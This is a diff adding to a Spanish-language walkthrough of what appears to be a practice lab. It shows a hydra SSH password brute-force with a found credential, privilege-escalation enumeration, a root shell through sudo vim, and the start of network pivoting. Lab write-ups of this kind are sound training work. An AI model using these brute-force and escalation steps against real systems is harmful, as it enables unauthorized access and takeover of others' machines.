@@ -77,8 +77,41 @@ Al acceder a /secret.php podemos ver lo siguiente:
 
 Ya tenemos un usuario con el que probar fuerza bruta en ssh.
 
+Podemos probar hydra ahora con mario para ver si encontramos alguna password. 
+```bash
+hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
+```
+ Encontramos la password chocolate para mario. Entramos a su sesión:
+ ```bash
+ssh mario@10.10.10.2
+```
 
+Ahora vamos a intentar escalar privilegios. 
+```bash
+find / -perm 4000 -type f 2>/dev/null
+cat /etc/crontab
+sudo -l
+```
 
+Con `sudo -l` vemos que podemos ejecutar vim con mario como si fuésemos root. Por tanto vamos a entrar a vim y podemos ejecutar una bash como root:
+```bash
+sudo vim hola
+
+# En la sección de abajo donde se guarda con :wq! ponemos:
+:!bash
+```
+Se nos ejecuta una shell de root. Ya somos root en la primera máquina. Vamos ahora a descubrir la nueva máquina intermedia a partir de esta.
+
+Desde trust miramos la red a ver que tenemos:
+```bash
+ifconfig
+```
+
+Encontramos esto:
+
+<img width="851" height="543" alt="imagen" src="https://github.com/user-attachments/assets/73c5901f-2920-4219-a22b-87ab500507a7" />
+
+Tenemos dos interfaces de red. Una a la máquina Kali y otra a otra red interna a la que Kali no va tener acceso. 
 
 
 
